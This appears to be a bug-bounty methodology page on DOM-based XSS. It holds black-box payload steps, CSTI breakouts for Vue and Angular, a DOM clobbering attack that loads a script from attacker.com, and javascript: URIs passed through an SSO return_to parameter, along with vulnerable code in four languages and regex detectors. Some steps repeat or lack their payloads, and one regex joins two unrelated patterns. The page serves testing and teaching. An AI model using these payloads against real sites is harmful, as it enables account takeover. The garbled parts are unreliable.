# DOM-Based Cross Site Scripting

## Check List

## Methodology

### Black Box

#### [DOM in URL Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss)

{% stepper %}
{% step %}
Check the search bar or URL parameter query in the blog page to see if user input is reflected in the HTML output
{% endstep %}

{% step %}
Make a simple search with normal keywords like HI and verify the query appears in the page source or response
{% endstep %}

{% step %}
Then inject a basic HTML tag like `#">` into the query parameter and check if it renders as broken image
{% endstep %}

{% step %}
If the greater-than `>` is HTML-encoded and event handlers are removed, WAF is filtering XSS
{% endstep %}

{% step %}
Then try a script tag directly in the URL query like `#alert(document.domain)` to bypass the WAF
{% endstep %}

{% step %}
If the alert fires on document.domain, reflected XSS is confirmed
{% endstep %}

{% step %}
Test the query parameter on other Microsoft blog endpoints like `/msrc/blog`, `/security`,`/vulnerability`, or `/research` as these often have search functionality with similar reflection
{% endstep %}

{% step %}
Common vulnerable paths include `/msrc/blog/search`, `/security/blog`, `/vulnerability/research`, or `/msrc/search`
{% endstep %}
{% endstepper %}

***

#### [DOM in Search Bar](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss)

{% stepper %}
{% step %}
Load the target forum or community site and locate the search bar, typically in the top right corner or header
{% endstep %}

{% step %}
Open the site and click the search button
{% endstep %}

{% step %}
Enter a payload like `@prompt(1337)gmail.com` into the search bar and submit the query
{% endstep %}

{% step %}
Type the payload in the search input and hit enter
{% endstep %}

{% step %}
Check if a new window or page opens with advanced search; if the payload is reflected unsanitized in the input field or results, it may trigger XSS
{% endstep %}

{% step %}
Observe the advanced search page for script execution (`alert(1337)`)
{% endstep %}

{% step %}
Copy the generated URL containing the reflected payload and test it in a new tab or send to a victim to verify persistence or delivery

```
https://example.org/search?q=@<script>prompt(1337)</script>gmail.com
```
{% endstep %}
{% endstepper %}

***

#### SPA Sites

{% stepper %}
{% step %}
Find any JavaScript-heavy site or SPA with client-side rendering
{% endstep %}

{% step %}
Check the page source or dev tools to locate JS code using `innerHTML`, `document.write`, `insertAdjacentHTML`, or `outerHTML`
{% endstep %}

{% step %}
Make a normal interaction (`search`, `profile`, `settings`) and use Elements tab to see if user input (`URL param`, form, `localStorage`) flows into these DOM sinks
{% endstep %}

{% step %}
Then inject a test payload like  into the input source (`URL`, `field`, `hash`)
{% endstep %}

{% step %}
Example URL

```
https://target.com/search?q=<img src=x onerror=alert(1)>
```
{% endstep %}

{% step %}
Example Hash

```
#<svg onload=alert(1)>
```
{% endstep %}

{% step %}
If the payload appears in DOM and alert fires without server response change, DOM XSS is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Dynamic Client-Side Template Injection via Server-Driven UI (SDUI) Serialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on mobile-first or highly dynamic Single Page Applications (SPAs) that employ Server-Driven UI (SDUI) architectures to dictate layout and component rendering from the backend
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Server-Driven UI" architecture. To ensure feature parity across iOS, Android, and Web without requiring continuous app store approvals, the backend API does not merely return raw data (e.g., `{"name": "Alice"}`). Instead, it returns a JSON payload detailing the exact UI components to render (e.g., `{"component": "UserBanner", "layout": "row"}`)
{% endstep %}

{% step %}
Analyze the frontend evaluation sink. The SPA receives the SDUI JSON payload and passes the `template` string directly into a client-side rendering engine (e.g., Vue.js runtime compiler, Angular's `$compile`, or a dynamic React `dangerouslySetInnerHTML` wrapper) to convert the string into active DOM nodes
{% endstep %}

{% step %}
Discover the fatal architectural assumption: The backend engineers assume that because the response is strictly serialized as `application/json`, the data is mathematically immune to Cross-Site Scripting (XSS). They implicitly trust the JSON encoding process to neutralize dangerous characters like `<` and `>`
{% endstep %}

{% step %}
Discover the fatal architectural assumption: The backend engineers assume that because the response is strictly serialized as `application/json`, the data is mathematically immune to Cross-Site Scripting (XSS). They implicitly trust the JSON encoding process to neutralize dangerous characters like `<` and `>`
{% endstep %}

{% step %}
Understand the vulnerability: The JSON serializer successfully escapes HTML, neutralizing standard Reflected XSS. However, the frontend rendering engine evaluates the string _after_ the JSON has been parsed. If the backend interpolates user-controlled data directly into the template string before JSON serialization, the attacker can inject Client-Side Template Injection (CSTI) syntax ( `{{...}}`)
{% endstep %}

{% step %}
Formulate the SDUI Template Forgery payload. Identify a profile field or input parameter that is reflected within a Server-Driven UI component (e.g., your Account Name or a Custom Workspace Title)
{% endstep %}

{% step %}
Construct a payload utilizing the execution syntax specific to the target frontend framework. For Vue.js, use `{{constructor.constructor('alert(document.domain)')()}}`. For Angular, use `{{$on.constructor('alert(document.domain)')()}}`
{% endstep %}

{% step %}
Submit the payload to the backend via a standard profile update or data creation endpoint
{% endstep %}

{% step %}
Navigate to the dashboard or view that triggers the SDUI rendering
{% endstep %}

{% step %}
The backend dynamically constructs the UI component. It concatenates your malicious template syntax into the component's `Template` string. It JSON-serializes the object and returns HTTP 200 OK
{% endstep %}

{% step %}
The frontend SPA parses the JSON response
{% endstep %}

{% step %}
The frontend rendering engine evaluates the `Template` string to build the DOM. It recognizes the `{{...}}` syntax not as data, but as native framework execution directives. The rendering engine compiles and executes the payload, achieving arbitrary JavaScript execution directly within the trusted DOM context, completely bypassing all backend HTML sanitization and WAF filters

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:await\s+Task\.WhenAll\s*\(\s*rules\.Select\s*\(\s*\w+\s*=>\s*\w+\.Calculate|Task\.WhenAll[\s\S]{0,150}?(?:Calculate|Evaluate|Apply))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:\.parallelStream\(\)\.map\s*\(\s*\w+\s*->\s*\w+\.apply|parallelStream\(\)[\s\S]{0,150}?(?:calculate|apply|evaluate))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$deltas\s*=\s*Swoole\\\\Coroutine\\\\batch\s*\(|Coroutine\\\\batch\s*\([\s\S]{0,150}?(?:calculate|apply|evaluate))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:Promise\.all\s*\(\s*promotions\.map\s*\(\s*\w+\s*=>\s*\w+\.evaluate|Promise\.all[\s\S]{0,150}?(?:calculate|evaluate|apply))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
await\s+Task\.WhenAll\(rules\.Select\(r\s*=>\s*r\.Calculate
```
{% endtab %}

{% tab title="Java" %}
```regexp
\.parallelStream\(\)\.map\(rule\s*->\s*rule\.apply
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$deltas\s*=\s*Swoole\\\\Coroutine\\\\batch\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
Promise\.all\(promotions\.map\(p\s*=>\s*p\.evaluate
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
<pre class="language-csharp"><code class="lang-csharp">[HttpGet("/api/v1/dashboard/sdui")]
<strong>public async Task&#x3C;IActionResult> GetDashboardUi()
</strong>{
    var user = await _dbContext.Users.FindAsync(User.GetUserId());

    // [1]
    // [2]
    // The backend dictates the UI structure to ensure multi-platform consistency
    var sduiResponse = new SduiPage
    {
        PageId = "Home",
        Components = new List&#x3C;SduiComponent>
        {
            new SduiComponent 
            {
                Type = "WelcomeBanner",
                // [3]
                // [4]
                // Developer securely JSON serializes the response, assuming it prevents XSS.
                // However, concatenating raw user input into a string destined for a frontend 
                // template compiler exposes the application to CSTI.
                Template = $"&#x3C;div class='banner'>Welcome back, &#x3C;b>{user.FullName}&#x3C;/b>!&#x3C;/div>"
            },
            new SduiComponent { Type = "ActivityFeed" }
        }
    };

    return Ok(sduiResponse);
}
</code></pre>
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class DashboardSduiController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping(value = "/api/v1/dashboard/sdui", produces = MediaType.APPLICATION_JSON_VALUE)
    public ResponseEntity<JsonNode> getDashboardUi(Principal principal) {
        User user = userRepository.findByUsername(principal.getName());
        ObjectMapper mapper = new ObjectMapper();

        // [1]
        // [2]
        ObjectNode response = mapper.createObjectNode();
        response.put("pageId", "Home");
        ArrayNode components = response.putArray("components");

        ObjectNode banner = mapper.createObjectNode();
        banner.put("type", "WelcomeBanner");
        
        // [3]
        // [4]
        // String concatenation creates a dynamic template payload
        banner.put("template", "<div class='banner'>Welcome back, <b>" + user.getFullName() + "</b>!</div>");
        components.add(banner);

        return ResponseEntity.ok(response);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class DashboardSduiController extends Controller
{
    public function getDashboardUi(Request $request)
    {
        $user = $request->user();

        // [1]
        // [2]
        $components = [
            [
                'type' => 'WelcomeBanner',
                // [3]
                // [4]
                // PHP natively escapes quotes during json_encode, but leaves Vue/Angular brackets untouched.
                'template' => "<div class='banner'>Welcome back, <b>{$user->full_name}</b>!</div>"
            ],
            [
                'type' => 'ActivityFeed'
            ]
        ];

        return response()->json([
            'pageId' => 'Home',
            'components' => $components
        ]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/dashboard/sdui', async (req, res) => {
    let user = await User.findByPk(req.user.id);

    // [1]
    // [2]
    // Server-Driven UI payload construction
    let sduiResponse = {
        pageId: 'Home',
        components: [
            {
                type: 'WelcomeBanner',
                // [3]
                // [4]
                // The frontend engine parses this literal string and dynamically compiles it.
                template: `<div class='banner'>Welcome back, <b>${user.fullName}</b>!</div>`
            },
            {
                type: 'ActivityFeed'
            }
        ]
    };

    res.json(sduiResponse);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture employs Server-Driven UI (SDUI) to abstract layout and rendering logic away from the client devices, allowing centralized, instantaneous UI updates across web and mobile platforms, \[2] The backend API transmits JSON payloads containing precise instructions on which components to render and the structural HTML/Template strings they should contain, \[3] To prevent traditional Reflected or Stored XSS, the application relies entirely on standard `application/json` serialization, knowing that standard JSON encoding inherently escapes structural HTML breaking characters (like quotes and control characters), \[4] The execution sink. The developers mistakenly assumed the JSON transport layer immunized the data payload. However, the frontend SPA (e.g., Vue, Angular) receives the unescaped template string and passes it into its runtime compiler to construct the virtual DOM. By injecting native framework interpolation brackets (`{{...}}`), the attacker exploits the frontend compiler's abstract syntax tree (AST). The backend serves as an unwitting delivery vehicle, packing the un-sanitized client-side execution directives securely inside a mathematically valid JSON envelope

```http
// 1. Attacker interacts with a standard profile update endpoint.
// 2. Attacker injects a Client-Side Template Injection payload into their FullName field.
// The payload is tailored to bypass Vue.js 3 sandbox restrictions.

PUT /api/v1/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "fullName": "{{_setup._setupProxy.constructor.constructor('alert(\"DOM_XSS\")')()}}"
}

// 3. The backend stores the payload safely in the database.
// 4. The attacker navigates to the main Dashboard SPA.
// 5. The SPA requests the SDUI configuration from the backend.

GET /api/v1/dashboard/sdui HTTP/1.1
Host: api.enterprise.tld

// 6. The backend constructs the SDUI JSON, interpolating the malicious name.
HTTP/1.1 200 OK
Content-Type: application/json

{
  "pageId": "Home",
  "components": [
    {
      "type": "WelcomeBanner",
      "template": "<div class='banner'>Welcome back, <b>{{_setup._setupProxy.constructor.constructor('alert(\"DOM_XSS\")')()}}</b>!</div>"
    }
  ]
}

// 7. The Vue.js SPA receives the JSON. It passes the `template` string into its runtime compiler.
// 8. The Vue compiler parses the {{...}} brackets and executes the native JavaScript Function constructor breakout.
// 9. Arbitrary JavaScript executes within the victim's DOM context.
```
{% endstep %}

{% step %}
To unify user experience across heterogeneous client platforms, architects implemented Server-Driven UI (SDUI). This optimization shifted rendering authority from the client to the server, encapsulating structural DOM strings within JSON API responses. The security failure stemmed from a deep misunderstanding of frontend hydration mechanics. Backend engineers assumed that strict JSON serialization provided absolute protection against Cross-Site Scripting, failing to recognize that the frontend SPA treated the delivered strings as active, compilable templates rather than inert text. The attacker exploited this asymmetric interpretation by injecting Client-Side Template Injection (CSTI) syntax into a standard user field. The backend safely stored and encapsulated the payload within the JSON envelope. Upon delivery, the frontend runtime compiler unwrapped the JSON, identified the native execution brackets, and seamlessly executed the attacker's JavaScript, transforming a secure API response into a catastrophic DOM XSS execution vector
{% endstep %}
{% endstepper %}

***

#### Execution Hijacking via DOM Clobbering in Server-Sanitized Multi-Tenant Theming

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on massive white-label SaaS platforms, Help Centers, or E-Commerce engines (e.g., Zendesk, Shopify, Discourse) that allow Tenant Administrators to upload custom HTML/CSS themes to heavily customize their public-facing storefronts
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend theme sanitization engine
{% endstep %}

{% step %}
Identify the "Server-Side Sanitization" architecture. To prevent Tenant Administrators from injecting Stored XSS that could compromise the platform's super-admins or intercept global platform telemetry, the backend applies a strict HTML Sanitizer (e.g., OWASP Java HTML Sanitizer, .NET `HtmlSanitizer`, DOMPurify on Node.js) to all uploaded theme files before persisting them to the database
{% endstep %}

{% step %}
Investigate the Sanitizer's explicit configuration. The sanitizer aggressively strips `<script>`, `<iframe>`, `<object>`, and `onerror` event handlers. However, to ensure tenants can apply complex CSS styling and deep-link navigation, the sanitizer explicitly _allows_ the `id`, `name`, `class`, and `href` attributes on generic elements like `<a>` and `<div>`
{% endstep %}

{% step %}
Analyze the core Frontend Single Page Application (SPA). The enterprise injects a proprietary, un-modifiable JavaScript bootstrapper into every tenant's storefront. This bootstrapper is responsible for loading the core platform logic, analytics, and dynamic Webpack chunks
{% endstep %}

{% step %}
Discover the architectural dependency: To support multi-region deployments, the bootstrapper dynamically resolves its base URL by referencing a globally scoped JavaScript variable (e.g., `window.EnterpriseThemeConfig.CdnUrl`)
{% endstep %}

{% step %}
Understand the DOM Clobbering vulnerability: Modern web browsers automatically map HTML elements possessing `id` or `name` attributes into the global `window` object space. If an attacker creates an HTML element with `id="EnterpriseThemeConfig"`, the browser initializes `window.EnterpriseThemeConfig` as an `HTMLAnchorElement` or `HTMLFormElement`
{% endstep %}

{% step %}
Formulate the DOM Clobbering payload. You must construct benign-looking HTML that perfectly passes the backend's strict XSS sanitizer but structurally overwrites the frontend's global configuration objects
{% endstep %}

{% step %}
Construct an Anchor tag (`<a>`) to clobber the configuration variable. The `href` attribute of an anchor tag maps perfectly to the `.href` or `.url` properties when evaluated by JavaScript
{% endstep %}

{% step %}
Payload structure: `<a id="EnterpriseThemeConfig" href="[https://attacker.com/malware.js](https://attacker.com/malware.js)"></a>`
{% endstep %}

{% step %}
Upload the custom theme payload via the Tenant Administration dashboard
{% endstep %}

{% step %}
The backend HTML Sanitizer intercepts the payload. It verifies that `<a>` is a permitted tag. It verifies that `id` and `href` are permitted attributes. The payload is declared secure and saved to the database
{% endstep %}

{% step %}
An enterprise Super-Admin or standard user visits the storefront. The backend serves the clobbered HTML theme alongside the core frontend bootstrapper
{% endstep %}

{% step %}
The browser renders the HTML, mapping the attacker's anchor tag to `window.EnterpriseThemeConfig`
{% endstep %}

{% step %}
The core bootstrapper executes. It queries `window.EnterpriseThemeConfig.href`. Instead of receiving the platform's trusted CDN URL, it receives the attacker's malicious URL. The bootstrapper dynamically generates a `<script src="[https://attacker.com/malware.js](https://attacker.com/malware.js)">` tag and appends it to the DOM, achieving total Execution Hijacking via purely structural, sanitizer-approved HTML

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:sanitizer\.AllowedAttributes\.Add\s*\(\s*"id"\s*\)|sanitizer\.AllowedAttributes\.Add\s*\(\s*"name"\s*\)|AllowedAttributes\.(?:Add|AddRange)\s*\([\s\S]{0,100}?(?:id|name))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:policyFactory\.allowAttributes\s*\(\s*"id"\s*,\s*"name"\s*\)|policyFactory\.allowAttributes\s*\([\s\S]{0,100}?(?:id|name)|allowAttributes\s*\([\s\S]{0,100}?(?:id|name))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$config->set\s*\(\s*'HTML\.Allowed'\s*,\s*'.*?(?:id|name).*?'\s*\)|HTML\.Allowed.*(?:id|name)|\$config->set\s*\([\s\S]{0,100}?HTML\.Allowed)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:sanitizeHtml\s*\([\s\S]{0,150}?allowedAttributes\s*:\s*\{[\s\S]{0,150}?(?:'id'|"id"|'name'|"name")|allowedAttributes\s*:\s*\{[\s\S]{0,150}?(?:id|name))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
sanitizer\.AllowedAttributes\.Add\("id"\)|sanitizer\.AllowedAttributes\.Add\("name"\)|AllowedAttributes\.(Add|AddRange).*(id|name)
```
{% endtab %}

{% tab title="Java" %}
```regexp
policyFactory\.allowAttributes\("id",\s*"name"\)|allowAttributes.*(id|name)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$config->set\('HTML\.Allowed',\s*'.*id.*'\)|HTML\.Allowed.*(id|name)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
sanitizeHtml\(.*allowedAttributes:.*('id'|"id"|'name'|"name")|allowedAttributes:.*(id|name)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ThemeSanitizationService
{
    private readonly HtmlSanitizer _sanitizer;

    public ThemeSanitizationService()
    {
        _sanitizer = new HtmlSanitizer();
        
        // [1]
        // [2]
        _sanitizer.AllowedTags.Add("div");
        _sanitizer.AllowedTags.Add("a");
        
        // [3]
        // [4]
        // Allowing 'id' is deemed safe because scripts and event handlers are removed natively.
        _sanitizer.AllowedAttributes.Add("id");
        _sanitizer.AllowedAttributes.Add("name");
        _sanitizer.AllowedAttributes.Add("class");
    }

    public string SanitizeThemeHtml(string rawHtml)
    {
        return _sanitizer.Sanitize(rawHtml);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class ThemeSanitizationService {

    // [1]
    // [2]
    // Enterprise HTML sanitizer configuration
    private final PolicyFactory policy = new HtmlPolicyBuilder()
            .allowElements("a", "div", "span", "p", "h1", "h2", "ul", "li")
            // [3]
            // [4]
            // Explicitly allows 'id' and 'name' to permit anchor linking and CSS styling
            .allowAttributes("id", "name", "class").globally()
            .allowAttributes("href").onElements("a")
            .allowUrlProtocols("https", "http")
            .toFactory();

    public String sanitizeThemeHtml(String rawHtml) {
        // Strips all <script>, <iframe>, and event handlers
        return policy.sanitize(rawHtml);
    }
}

// Frontend Bootstrapper (app.js):
// // Fallback to window config if not injected properly
// const cdnBase = window.PlatformConfig.href || 'https://default-cdn.enterprise.com/js/';
// const script = document.createElement('script');
// script.src = cdnBase + 'core-metrics.js';
// document.head.appendChild(script);
```


{% endtab %}

{% tab title="PHP" %}
```php
class ThemeSanitizationService
{
    public function sanitizeThemeHtml(string $rawHtml): string
    {
        // [1]
        // [2]
        $config = \HTMLPurifier_Config::createDefault();
        
        // [3]
        // [4]
        // Defines the allowed tags and attributes. 
        // ID and Name are explicitly permitted to support multi-tenant layout requirements.
        $config->set('HTML.Allowed', 'a[href|id|name|class],div[id|class],span[id|class],p,b,strong,i,em');
        $config->set('Attr.EnableID', true);

        $purifier = new \HTMLPurifier($config);
        
        return $purifier->purify($rawHtml);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const sanitizeHtml = require('sanitize-html');

class ThemeSanitizationService {
    static sanitizeThemeHtml(rawHtml) {
        // [1]
        // [2]
        return sanitizeHtml(rawHtml, {
            allowedTags: [ 'b', 'i', 'em', 'strong', 'a', 'div', 'span' ],
            allowedAttributes: {
                // [3]
                // [4]
                // Allowing structural and styling attributes while blocking execution sinks
                '*': [ 'id', 'name', 'class' ],
                'a': [ 'href' ]
            },
            allowedSchemes: [ 'http', 'https' ]
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To provide highly customizable white-label storefronts, the enterprise permits tenants to upload bespoke HTML/CSS themes, \[2] To prevent malicious tenants from deploying Stored XSS that could compromise the central platform, developers pass all uploaded themes through an enterprise-grade HTML Sanitization engine, \[3] The architecture assumes that stripping programmatic elements (`<script>`, `<iframe>`) and execution handlers (`onclick`) ensures absolute safety. To maintain CSS styling and internal page navigation capabilities, developers explicitly configure the sanitizer to permit structural attributes like `id` and `name,` \[4] The execution sink. The developers failed to account for browser DOM-Window mapping mechanics. Modern browsers automatically cast elements with `id` attributes into global `window` variables. By injecting a benign-looking anchor tag (`<a id="PlatformConfig" href="[https://evil.com](https://evil.com)"></a>`), the attacker successfully navigates the strict backend sanitizer. Once rendered, the browser clobbers the `window.PlatformConfig` namespace. When the platform's core JavaScript bootstrapper queries this configuration to dynamically lazy-load subsequent scripts, it extracts the attacker's URL and initiates a fatal DOM XSS sink execution

```http
// 1. Attacker (Tenant Admin) analyzes the target storefront's source code.
// They notice the core platform analytics script is loaded dynamically:
// let cdn = window.PlatformConfig.href || 'https://cdn.enterprise.com';
// document.write('<script src="' + cdn + '/metrics.js"></script>');

// 2. Attacker prepares a custom HTML theme payload designed to clobber the window.PlatformConfig object.
// 3. Attacker submits the payload to the backend theme engine.

POST /api/v1/tenant/theme/update HTTP/1.1
Host: admin.enterprise.tld
Authorization: Bearer <tenant_admin_token>
Content-Type: application/json

{
  "themeName": "Clobber Theme",
  "htmlContent": "<div class='header'><a id='PlatformConfig' href='https://attacker.com/malicious_payload'>Click Here</a><h1>Welcome to my store</h1></div>"
}

// 4. The backend HTML Sanitizer inspects the payload. 
// <a> is allowed. 'id' is allowed. 'href' is allowed.
// The payload is deemed 100% secure and stored in the database.

// 5. A victim visits the storefront.
// 6. The browser renders the attacker's <a> tag. It maps `PlatformConfig` to the HTMLAnchorElement.
// 7. The platform's app.js executes: window.PlatformConfig.href 
// 8. The browser returns "https://attacker.com/malicious_payload".
// 9. The bootstrapper injects the attacker's script into the DOM, achieving full Account Takeover.
```
{% endstep %}

{% step %}
To support complex multi-tenant UI customizations while neutralizing stored XSS, security architects deployed rigorous, server-side HTML sanitization pipelines. This optimization relied on the assumption that programmatic execution originated exclusively from explicit scripting elements and event handlers. By explicitly authorizing generic structural attributes (`id`, `name`) to preserve CSS and navigational fidelity, the backend inadvertently authorized DOM namespace manipulation. The attacker exploited this asymmetric interpretation by utilizing DOM Clobbering techniques. Submitting purely structural, perfectly sanitized HTML elements, the attacker successfully overwrote critical global configuration namespaces mapping directly to the `window` object. When the platform's trusted frontend bootstrapper queried these global objects to resolve CDN paths, it unwittingly consumed the clobbered URLs, autonomously injecting the attacker's remote JavaScript payloads into the trusted execution DOM
{% endstep %}
{% endstepper %}

***

#### Protocol-Agnostic Deep Link Execution via Asynchronous SSO Routing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on unified Single Sign-On (SSO) or OAuth/OIDC login flows that serve both Mobile WebViews (iOS/Android) and Single Page Web Applications (SPAs) concurrently
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's post-authentication routing sequence
{% endstep %}

{% step %}
Identify the "Unified Routing" architecture. When a user begins an OAuth flow, the client application passes a `return_to` parameter indicating where the user should be redirected after successful authentication
{% endstep %}

{% step %}
Investigate the API latency and state-loss optimization. Historically, SSO flows concluded with the backend server issuing an HTTP `302 Found` redirect. However, executing an HTTP redirect breaks SPA application state and creates complex handling errors inside Mobile WebViews
{% endstep %}

{% step %}
Discover the asynchronous routing optimization: To ensure seamless transitions, the backend developer halts the HTTP 302 redirect. Instead, upon successful authentication, the backend API responds with an HTTP `200 OK` JSON payload containing the user's JWT and the final `nextUrl` string (e.g., `{"token": "eyJhb...", "nextUrl": "/dashboard/profile"}`)
{% endstep %}

{% step %}
Analyze the frontend routing sink. The frontend SPA receives the JSON payload. It stores the JWT and executes a programmatic navigation command utilizing the provided URL (e.g., `window.location.assign(response.nextUrl)`)
{% endstep %}

{% step %}
Understand the critical protocol validation bypass: Modern web browsers explicitly prevent developers from returning `javascript:` URIs inside HTTP `Location` headers (HTTP 302). Browsers will refuse to execute them. By migrating the routing instruction out of the HTTP Transport Layer and into an `application/json` data payload, the backend entirely circumvents the browser's native protocol firewall
{% endstep %}

{% step %}
Formulate the Routing Protocol Forgery payload. You must initiate the SSO flow, supply a malicious protocol URI as the `return_to` parameter, and ensure it survives the backend storage pipeline
{% endstep %}

{% step %}
Construct the payload: `return_to=javascript:alert(document.domain)`
{% endstep %}

{% step %}
Initiate the OAuth login sequence (e.g., `GET /api/v1/auth/authorize?client_id=123&return_to=javascript:alert(1)`)
{% endstep %}

{% step %}
The backend extracts the `return_to` string and stores it in the temporary OIDC session cache (or encodes it into the OAuth `state` parameter)
{% endstep %}

{% step %}
Complete the login flow via your IdP
{% endstep %}

{% step %}
The backend verifies the authentication. It retrieves the stored `return_to` string. Because it is generating a JSON payload, it assumes the string is structurally inert (it poses no Reflected XSS risk because it is inside an `application/json` response). It issues the payload: `{"nextUrl": "javascript:alert(1)"}`
{% endstep %}

{% step %}
The frontend SPA receives the JSON payload. Relying on the trusted API response, it extracts `nextUrl` and pipes it directly into the `window.location` sink. Because the string contains a `javascript:` scheme, the browser executes the payload within the context of the application's DOM, resulting in a devastating, fully authenticated DOM XSS execution

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)\b(?:return\s+Ok\s*\(\s*new\s*\{\s*nextUrl\s*=\s*authState\.ReturnUrl\s*\}|return\s+Ok\s*\(\s*new\s*\{[\s\S]{0,100}?nextUrl\s*=|nextUrl\s*=\s*authState\.(?:ReturnUrl|RedirectUri|CallbackUrl))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:return\s+ResponseEntity\.ok\s*\(\s*Map\.of\s*\(\s*"nextUrl"\s*,\s*authState\.getReturnUrl\s*\(\s*\)\s*\)\s*\)|ResponseEntity\.ok[\s\S]{0,100}?nextUrl|authState\.get(?:ReturnUrl|RedirectUri|CallbackUrl))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:return\s+response\s*\(\s*\)->json\s*\(\s*\[\s*'nextUrl'\s*=>\s*\$authState->(?:return_to|returnUrl|redirect_uri)\s*\]|response\(\)->json[\s\S]{0,100}?nextUrl)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:res\.json\s*\(\s*\{\s*nextUrl\s*:\s*session\.(?:returnTo|redirectTo|callbackUrl)\s*\}\s*\)|res\.json[\s\S]{0,100}?nextUrl|nextUrl\s*:\s*session\.)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
return\s+Ok\(new\s*\{\s*nextUrl\s*=\s*authState\.ReturnUrl\s*\}|nextUrl\s*=.*ReturnUrl
```
{% endtab %}

{% tab title="Java" %}
```regexp
ResponseEntity\.ok\(Map\.of\("nextUrl",\s*authState\.getReturnUrl\(\)\)\)|getReturnUrl\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
response\(\)->json\(\['nextUrl'\s*=>\s*\$authState->return_to\]\)|nextUrl.*return_to
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.json\(\{\s*nextUrl:\s*session\.returnTo\s*\}\)|nextUrl:\s*session\.
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/auth/callback")]
public async Task<IActionResult> SsoCallback([FromQuery] string code, [FromQuery] string state)
{
    var authStateJson = await _redis.StringGetAsync($"oauth:state:{state}");
    var authState = JsonConvert.DeserializeObject<AuthState>(authStateJson);

    var jwt = await _idpClient.ExchangeCodeAsync(code);

    // [1]
    // [2]
    // [3]
    // [4]
    // Sending the untrusted URI protocol back to the client inside a JSON envelope
    // entirely bypasses the browser's native HTTP 302 Location header safeguards.
    return Ok(new 
    { 
        Status = "Authenticated", 
        Token = jwt, 
        NextUrl = authState.ReturnUrl 
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class AuthCallbackController {

    @Autowired
    private StringRedisTemplate redisTemplate;
    @Autowired
    private IdentityProviderClient idpClient;

    @GetMapping(value = "/api/v1/auth/callback", produces = MediaType.APPLICATION_JSON_VALUE)
    public ResponseEntity<?> ssoCallback(@RequestParam String code, @RequestParam String state) throws Exception {
        
        String authStateJson = redisTemplate.opsForValue().get("oauth:state:" + state);
        AuthState authState = new ObjectMapper().readValue(authStateJson, AuthState.class);

        String jwt = idpClient.exchangeCode(code);

        // [1]
        // [2]
        // [3]
        // [4]
        return ResponseEntity.ok(Map.of(
            "status", "Authenticated",
            "token", jwt,
            "nextUrl", authState.getReturnUrl() // No protocol validation (http/https) enforced
        ));
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class AuthCallbackController extends Controller
{
    public function ssoCallback(Request $request)
    {
        $code = $request->query('code');
        $state = $request->query('state');

        $authStateJson = Redis::get("oauth:state:{$state}");
        $authState = json_decode($authStateJson);

        $jwt = IdentityProvider::exchangeCode($code);

        // [1]
        // [2]
        // [3]
        // [4]
        return response()->json([
            'status' => 'Authenticated',
            'token' => $jwt,
            'nextUrl' => $authState->return_to
        ]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/auth/callback', async (req, res) => {
    let code = req.query.code;
